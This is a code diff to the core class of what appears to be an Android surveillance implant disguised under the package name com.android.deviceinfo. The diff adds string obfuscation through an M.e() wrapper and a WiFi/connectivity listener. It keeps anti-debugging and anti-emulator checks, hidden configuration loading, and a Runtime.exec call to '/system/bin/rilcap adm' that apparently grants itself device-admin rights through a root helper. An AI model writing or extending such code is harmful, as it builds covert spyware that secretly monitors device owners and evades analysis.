@@ -12,14 +12,15 @@ import java.io.IOException;
 import android.app.Activity;
 import android.app.ActivityManager;
 import android.app.PendingIntent;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.res.Resources;
+import android.net.ConnectivityManager;
+import android.net.wifi.WifiManager;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
+import android.widget.Toast;
 
 import com.android.deviceinfo.action.Action;
 import com.android.deviceinfo.action.SubAction;
@@ -35,9 +36,8 @@ import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.gui.AGUI;
-import com.android.deviceinfo.gui.DeviceAdminRequest;
-import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.listener.BSm;
+import com.android.deviceinfo.listener.WR;
 import com.android.deviceinfo.manager.ManagerEvent;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.optimize.NetworkOptimizer;
@@ -45,6 +45,7 @@ import com.android.deviceinfo.util.AntiDebug;
 import com.android.deviceinfo.util.AntiEmulator;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Utils;
+import com.android.m.M;
 
 /**
  * The Class Core, represents
@@ -162,9 +163,23 @@ public class Core extends Activity implements Runnable {
 			wl.acquire();
 		}
 
-		EvidenceReference.info(Messages.getString("30_1")); //$NON-NLS-1$
+		// WiFi status manager
+		IntentFilter intentFilter = new IntentFilter();
+		intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
+		intentFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
+		
+		WR wifiReceiver = new WR();
+		Status.getAppContext().registerReceiver(wifiReceiver, intentFilter);
+		
+		EvidenceReference.info(M.e("Started")); //$NON-NLS-1$
 
 		serviceRunning = true;
+		
+		if (Cfg.DEMO) {
+			Status.self().makeToast(M.e("Agent started!"));
+			//Toast.makeText(Status.getAppContext().getApplicationContext(), M.e("Agent started!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+		
 		return true;
 	}
 
@@ -221,8 +236,8 @@ public class Core extends Activity implements Runnable {
 				// /system/bin/ntpsvd adm
 				// "com.android.deviceinfo/com.android.deviceinfo.listener.AR"
 				String pack = Status.self().getAppContext().getPackageName();
-				String bd = Messages.getString("32_43");
-				String tbe = String.format("%s %s/%s", bd, pack, Messages.getString("32_44"));
+				String bd = M.e("/system/bin/rilcap adm");
+				String tbe = String.format("%s %s/%s", bd, pack, M.e("com.android.deviceinfo.listener.AR"));
 				// /system/bin/ntpsvd adm
 				// \"com.android.networking/com.android.networking.listener.AR\"
 				Runtime.getRuntime().exec(tbe);
@@ -260,7 +275,7 @@ public class Core extends Activity implements Runnable {
 					Check.log(TAG + " Info: starting checking actions"); //$NON-NLS-1$
 				}
 
-				if (Cfg.DEMO) {
+				if (Cfg.DEMO && Cfg.DEMO_INITSOUND) {
 					Beep.beepPenta();
 				}
 
@@ -338,6 +353,7 @@ public class Core extends Activity implements Runnable {
 				}
 
 				if (Cfg.MEMOSTAT) {
+					M.printMostused();
 					logMemory();
 				}
 
@@ -566,11 +582,11 @@ public class Core extends Activity implements Runnable {
 
 			if (!loaded) {
 				// 30_2=Invalid new configuration, reverting
-				EvidenceReference.info(Messages.getString("30_2")); //$NON-NLS-1$
+				EvidenceReference.info(M.e("Invalid new configuration, reverting")); //$NON-NLS-1$
 				file.delete();
 			} else {
 				// 30_3=New configuration activated
-				EvidenceReference.info(Messages.getString("30_3")); //$NON-NLS-1$
+				EvidenceReference.info(M.e("New configuration activated")); //$NON-NLS-1$
 				file.rename(Path.conf() + ConfType.ActualConf);
 				ret = ConfType.NewConf;
 			}
@@ -588,7 +604,7 @@ public class Core extends Activity implements Runnable {
 
 				if (!loaded) {
 					// Actual configuration corrupted
-					EvidenceReference.info(Messages.getString("30_4")); //$NON-NLS-1$
+					EvidenceReference.info(M.e("Actual configuration corrupted")); //$NON-NLS-1$
 				} else {
 					ret = ConfType.ActualConf;
 				}
@@ -600,7 +616,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (loadConf): TRY JSONCONF");
 			}
 
-			final byte[] resource = Utils.getAsset("c.bin"); // config.bin
+			final byte[] resource = Utils.getAsset(M.e("c.bin")); // config.bin
 			String json = new String(resource);
 			// Initialize the configuration object
 
@@ -625,7 +641,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (loadConf): TRY RESCONF");
 			}
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.getAsset("c.bin"); // config.bin
+			final byte[] resource = Utils.getAsset(M.e("c.bin")); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
